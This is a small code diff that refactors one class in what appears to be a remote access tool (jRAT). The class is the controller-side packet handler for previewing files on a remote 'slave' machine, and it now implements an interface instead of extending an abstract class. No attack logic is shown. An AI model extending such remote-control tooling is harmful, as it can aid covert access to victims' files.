@@ -1,12 +1,12 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
 import jrat.module.fs.ui.previews.PanelPreviewFile;
 
 
-public class Packet42PreviewFile extends AbstractIncomingPacket {
+public class Packet42PreviewFile implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
